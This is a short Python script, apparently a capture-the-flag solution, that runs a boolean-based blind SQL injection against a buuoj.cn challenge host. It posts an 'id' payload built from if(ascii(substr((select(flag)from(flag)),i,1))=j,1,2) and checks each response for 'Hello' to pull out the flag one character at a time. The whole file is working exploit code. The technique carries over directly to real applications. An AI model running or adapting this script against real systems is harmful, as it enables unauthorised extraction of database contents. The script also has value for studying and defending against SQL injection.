import requests

url = "http://ca06a929-4e96-45d8-ba75-7bfc3100a603.node4.buuoj.cn:81/index.php"

result = ""
num = 0  # 用了来判断是不是flag已经拼完整了
for i in range(1, 60):

    if num == 1:
        break

    for j in range(32, 128):

        payload = "if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)" % (i, j)
        # print(str((i-1)*96+j-32)+":~"+payload+"~")

        data = {
            "id": payload,
        }

        r = requests.post(url, data=data)

        r.encoding = r.apparent_encoding

        if "Hello" in r.text:
            x = chr(j)
            result += str(x)
            print(result)
            break

        if "}" in result:
            print(result)
            num = 1
            break